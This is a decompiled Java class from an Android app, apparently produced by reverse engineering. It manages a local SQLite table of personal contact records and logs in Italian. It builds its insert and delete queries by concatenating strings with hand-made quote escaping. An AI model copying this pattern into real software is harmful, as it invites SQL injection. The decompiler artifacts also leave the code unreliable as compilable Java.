package com.app.system.common.h;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import com.app.system.common.entity.Contact;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class f
  extends b
{
  public f(Context paramContext)
  {
    super(paramContext);
  }
  
  private static String b(String paramString)
  {
    if (paramString.indexOf('\'') == -1) {
      return paramString;
    }
    return paramString.replace("'", "''");
  }
  
  public int a(List<Contact> paramList)
  {
    int i = 0;
    if (paramList != null) {
      try
      {
        if (paramList.size() == 0) {
          return -2;
        }
        b();
        Object localObject = "delete from  contact WHERE 1=0 ";
        Iterator localIterator = paramList.iterator();
        for (paramList = (List<Contact>)localObject; localIterator.hasNext(); paramList = ((StringBuilder)localObject).toString())
        {
          Contact localContact = (Contact)localIterator.next();
          localObject = new java/lang/StringBuilder;
          ((StringBuilder)localObject).<init>();
          ((StringBuilder)localObject).append(paramList);
          ((StringBuilder)localObject).append(" or rowid = ");
          ((StringBuilder)localObject).append(localContact.h());
        }
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        ((StringBuilder)localObject).append("Cancellazione contatti -- eseguo query\n");
        ((StringBuilder)localObject).append(paramList);
        a.d("TContact", ((StringBuilder)localObject).toString(), new Object[0]);
        this.a.execSQL(paramList);
        a();
      }
      catch (Exception paramList)
      {
        a.a("TContact", paramList.getMessage(), new Object[0]);
      }
    }
    i = -1;
    return i;
  }
  
  public long a(Contact paramContact)
  {
    try
    {
      b();
      SQLiteDatabase localSQLiteDatabase = this.a;
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("insert into contact (first, last, phone, email, company, address, modified_date) select '");
      localStringBuilder.append(b(paramContact.e()));
      localStringBuilder.append("', '");
      localStringBuilder.append(b(paramContact.f()));
      localStringBuilder.append("', '");
      localStringBuilder.append(b(paramContact.g()));
      localStringBuilder.append("', '");
      localStringBuilder.append(b(paramContact.d()));
      localStringBuilder.append("', '");
      localStringBuilder.append(b(paramContact.a()));
      localStringBuilder.append("', '");
      localStringBuilder.append(b(paramContact.b()));
      localStringBuilder.append("', ");
      localStringBuilder.append(paramContact.c());
      localStringBuilder.append(" where not exists (select 1 from contact where phone = '");
      localStringBuilder.append(b(paramContact.g()));
      localStringBuilder.append("'  and first = '");
      localStringBuilder.append(b(paramContact.e()));
      localStringBuilder.append("')");
      paramContact = localSQLiteDatabase.compileStatement(localStringBuilder.toString());
      paramContact.clearBindings();
      long l = paramContact.executeInsert();
      a();
      return l;
    }
    catch (Exception paramContact)
    {
      a.d("TContact", paramContact.getMessage(), new Object[0]);
    }
    return -1L;
  }
  
  public Contact a(Cursor paramCursor)
  {
    Contact localContact = new Contact();
    localContact.b(paramCursor.getLong(0));
    localContact.d(paramCursor.getString(1));
    localContact.e(paramCursor.getString(2));
    localContact.f(paramCursor.getString(3));
    localContact.a(paramCursor.getString(4));
    localContact.b(paramCursor.getString(5));
    localContact.a(paramCursor.getLong(6));
    localContact.c(paramCursor.getString(7));
    return localContact;
  }
  
  public List<Contact> a(int paramInt)
  {
    ArrayList localArrayList = new ArrayList();
    if (paramInt == 0) {}
    try
    {
      Object localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("select rowid, first, last, phone, company, address, modified_date, email from contact");
      ((StringBuilder)localObject).append(" order by modified_date desc ");
      localObject = ((StringBuilder)localObject).toString();
      break label75;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("select rowid, first, last, phone, company, address, modified_date, email from contact");
      ((StringBuilder)localObject).append(" order by modified_date desc limit ");
      ((StringBuilder)localObject).append(paramInt);
      localObject = ((StringBuilder)localObject).toString();
      label75:
      b();
      localObject = this.a.rawQuery((String)localObject, null);
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("Contact: Get ");
      localStringBuilder.append(paramInt);
      localStringBuilder.append(" / ");
      localStringBuilder.append(((Cursor)localObject).getCount());
      localStringBuilder.append(" RECORDS.");
      a.d("TContact", localStringBuilder.toString(), new Object[0]);
      if (((Cursor)localObject).moveToFirst()) {
        do
        {
          localArrayList.add(a((Cursor)localObject));
        } while (((Cursor)localObject).moveToNext());
      }
      ((Cursor)localObject).close();
      a();
    }
    catch (Exception localException)
    {
      a.a("TContact", localException.getMessage(), new Object[0]);
    }
    return localArrayList;
  }
}


/* Location:              ~/com/app/system/common/h/f.class
 *
 * Reversed by:           J
 */